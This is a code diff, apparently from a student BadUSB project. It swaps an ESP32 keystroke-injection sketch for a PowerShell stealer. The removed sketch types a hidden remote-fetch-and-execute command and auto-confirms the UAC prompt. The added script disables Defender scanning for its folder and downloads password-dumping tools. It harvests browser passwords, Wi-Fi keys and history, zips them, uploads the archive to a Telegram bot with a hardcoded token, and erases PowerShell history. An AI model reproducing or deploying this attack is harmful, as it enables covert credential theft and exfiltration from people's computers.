@@ -1,75 +1,117 @@
-#include <Arduino.h>
-#include "USB.h"
-#include "USBHIDKeyboard.h"
+#                      _                        
+#  _   _  ___  _   _  | | ___ __   _____      __
+# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
+# | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
+#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
+#  |___/                                        
 
-USBHIDKeyboard Keyboard;
-const int buttonPin = 0; // Nút BOOT trên S2 Mini
+$basePath = "C:\Users\Public\Documents\scripts"
+$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
+$dumpFile = "$dumpFolder.zip"
 
-void setup() {
-  pinMode(buttonPin, INPUT_PULLUP);
-  Keyboard.begin();
-  USB.begin();
+# Create directory
+New-Item -ItemType Directory -Path $basePath -Force | Out-Null
+Set-Location $basePath
+New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
+Add-MpPreference -ExclusionPath $basePath -Force
+
+# Download necessary tools
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe
+
+
+# Execute tools to gather data
+.\WNetWatcher.exe /stext connected_devices.txt
+.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt
+.\WebBrowserPassView.exe /stext passwords.txt
+.\WirelessKeyView.exe /stext wifi.txt
+
+# Wait for the files to be fully written
+while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt") -or !(Test-Path "history.txt")) {
+    Start-Sleep -Seconds 1
 }
 
-void loop() {
-  if (digitalRead(buttonPin) == LOW) {
-    delay(200); // Chống rung phím
+Move-Item passwords.txt, wifi.txt, connected_devices.txt, history.txt -Destination "$dumpFolder"
 
-    // 1. Initial delay to ensure the system is ready (DELAY 2500)
-    delay(2500);
+# Compress extracted data
+Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
 
-    // 2. Minimize all active windows (GUI d)
-    Keyboard.press(KEY_LEFT_GUI);
-    Keyboard.press('d');
-    delay(100);
-    Keyboard.releaseAll();
-    delay(500);
+# Wait until the ZIP file is created
+while (!(Test-Path "$dumpFile")) {
+    Start-Sleep -Seconds 1
+}
 
-    // 3. Open Run dialog (GUI r)
-    Keyboard.press(KEY_LEFT_GUI);
-    Keyboard.press('r');
-    delay(100);
-    Keyboard.releaseAll();
-    delay(500);
+# ===============================================================================
+# [THÊM MỚI] LƯU LẠI BẢN SAO RA MÀN HÌNH DESKTOP ĐỂ DEMO DỄ NHÌN
+# ===============================================================================
+$desktopPath = "$env:USERPROFILE\Desktop\DuLieu_BadUSB_$env:USERNAME.zip"
+Copy-Item -Path $dumpFile -Destination $desktopPath -Force
+# ===============================================================================
 
-    // 4. Mở PowerShell quyền Admin
-    Keyboard.print("powershell -w h -NoP -Ep Bypass -Command \"irm https://github.com/Sunlaii/ANM-Esp32BadUSB/blob/MinhNhat/src/ps.ps1 | iex\"");
-    delay(200);
 
-    // Nhấn CTRL + SHIFT + ENTER để chạy
-    Keyboard.press(KEY_LEFT_CTRL);
-    Keyboard.press(KEY_LEFT_SHIFT);
-    Keyboard.press(KEY_RETURN);
-    delay(100);
-    Keyboard.releaseAll();
+# Telegram configuration
+$token = "8671014944:AAEfUUYGPdYuhVHYdBKq1EFqoNLbPMS99QQ"
+# $chatID = "8671014944"
+$chatID = "8688296089"
+$uri = "https://api.telegram.org/bot$token/sendDocument"
+$caption = "Here are exfiltrated informations from $env:USERNAME"
 
-    // ==========================================
-    // 5. VƯỢT QUA UAC (ĐÃ FIX LỖI)
-    // ==========================================
-    
-    // TĂNG DELAY: Chờ 2.5 giây (hoặc 3 giây) để màn hình UAC hiện lên hoàn toàn
-    // Nếu máy nạn nhân chậm, bạn có thể tăng lên 3000 hoặc 4000
-    delay(2500); 
+# Check if the file exists before sending
+if (!(Test-Path $dumpFile)) {
+    exit 1
+}
 
-    // Dùng tổ hợp phím ALT + Y để nhấn nút "Yes"
-    Keyboard.press(KEY_LEFT_ALT);
-    Keyboard.press('y');
-    delay(100);
-    Keyboard.releaseAll();
-    
-    // Đợi một chút cho PowerShell kịp khởi động sau khi cấp quyền
-    delay(1000);
-
-    // 6. Flash CAPSLOCK as an indicator that execution is complete
-    // Nháy đèn Caps Lock 4 lần để báo hiệu xong
-    for(int i = 0; i < 4; i++) {
-      Keyboard.press(KEY_CAPS_LOCK);
-      delay(100);
-      Keyboard.releaseAll();
-      delay(500);
+# Ensure System.Net.Http is available
+if (-not ("System.Net.Http.HttpClient" -as [type])) {
+    $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName
+    if ($httpPath) {
+        Add-Type -Path $httpPath
+    } else {
+        exit 1
     }
-
-    // Chờ nhả nút để kết thúc
-    while(digitalRead(buttonPin) == LOW) delay(10);
-  }
 }
+
+# Create HTTP client
+$client = New-Object System.Net.Http.HttpClient
+$content = New-Object System.Net.Http.MultipartFormDataContent
+$content.Add((New-Object System.Net.Http.StringContent($chatID)), "chat_id")
+$content.Add((New-Object System.Net.Http.StringContent($caption)), "caption")
+
+# Attach the ZIP file
+$filename = [System.IO.Path]::GetFileName("$dumpFile")
+$fileStream = [System.IO.File]::OpenRead("$dumpFile")
+$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
+$content.Add($fileContent, "document", $filename)
+
+# Send data to Telegram
+try {
+    $client.PostAsync($uri, $content).Wait()
+} catch {}
+
+# Cleanup
+$fileStream.Close()
+$fileStream.Dispose()
+
+Set-Location C:\Users\Public\Documents
+
+# ===============================================================================
+# [CHỈNH SỬA] ĐÃ VÔ HIỆU HÓA LỆNH XÓA ĐỂ GIỮ LẠI FILE TRONG CÙNG THƯ MỤC
+# ===============================================================================
+# Remove-Item -Recurse -Force scripts
+# Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents\scripts" -Force
+# ===============================================================================
+
+# Caps Lock signal
+$keyBoardObject = New-Object -ComObject WScript.Shell
+for ($i=0; $i -lt 4; $i++) {
+    $keyBoardObject.SendKeys("{CAPSLOCK}")
+    Start-Sleep -Seconds 1
+}
+
+# Clear command history
+Clear-Content (Get-PSReadlineOption).HistorySavePath
+
+exit
